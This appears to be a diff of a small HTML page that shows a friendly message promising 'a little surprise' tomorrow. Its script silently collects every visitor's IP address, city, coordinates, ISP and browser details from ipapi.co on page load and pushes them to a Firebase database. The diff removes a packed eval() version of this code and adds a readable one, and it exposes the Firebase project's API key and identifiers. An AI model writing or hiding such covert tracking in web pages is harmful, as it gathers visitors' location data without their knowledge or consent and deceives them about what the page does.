@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -28,7 +27,7 @@
     }
 
     p {
-      font-size: 36px;
+      font-size: 36px; /* Bigger font */
       font-weight: bold;
       line-height: 1.8;
       margin: 0;
@@ -40,15 +39,49 @@
   </style>
 </head>
 <body>
+ 
   <div class="container">
-    <p>Have a great rest of your day. Tomorrow, this site holds a little surprise. 
-    <span role="img" aria-label="winking eye">😉</span>
-    </p>
-  </div>
-  <script>
-    
-eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('2 4={q:"AIzaSyA6FOahPr_40N1WS0S-VY_ssQRefwJt9c8",r:"messagetracker-fced6.firebaseapp.com",s:"https://messagetracker-fced6-default-rtdb.firebaseio.com",t:"messagetracker-fced6",u:"messagetracker-fced6.appspot.com",v:"770318035535",w:"1:770318035535:web:c8b802e29e11c59e44183a",x:"G-YXQNQSL5HR"};y.z(4);2 5=y.A();B("https://ipapi.co/json").C(a=>a.D()).E(b=>{2 6={f:b.f,g:b.g,h:b.h,i:b.i,j:b.j,k:b.k,l:b.l,m:b.m,n:(F G()).H(),o:I.J};5.K("L").M(6)});',49,49,'||||firebaseConfig|db|logData|_|||ip|data|const|firebase|ref|ip_logs_spdh|city|region|country|org|timezone|latitude|longitude|timestamp|userAgent|new|Date|toISOString|navigator|userAgent|apiKey|authDomain|databaseURL|projectId|storageBucket|messagingSenderId|appId|measurementId|firebase|initializeApp|database|fetch|then|json|then|push'.split('|'),0,{}))
 
+        <p>Have a great rest of your day. Tomorrow, this site holds a little surprise. 
+        <span role="img" aria-label="winking eye">😉</span>
+        </p>
+    </div>
+
+  <script>
+    // Your Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyA6FOahPr_40N1WS0S-VY_ssQRefwJt9c8",
+      authDomain: "messagetracker-fced6.firebaseapp.com",
+      databaseURL: "https://messagetracker-fced6-default-rtdb.firebaseio.com",
+      projectId: "messagetracker-fced6",
+      storageBucket: "messagetracker-fced6.appspot.com",
+      messagingSenderId: "770318035535",
+      appId: "1:770318035535:web:c8b802e29e11c59e44183a",
+      measurementId: "G-YXQNQSL5HR"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Fetch IP data
+    fetch("https://ipapi.co/json")
+      .then(response => response.json())
+      .then(data => {
+        const logData = {
+          ip: data.ip,
+          city: data.city,
+          region: data.region,
+          country: data.country_name,
+          org: data.org,
+          timezone: data.timezone,
+          latitude: data.latitude,
+          longitude: data.longitude,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent
+        };
+        db.ref("ip_logs_d1").push(logData);
+      });
   </script>
 </body>
 </html>
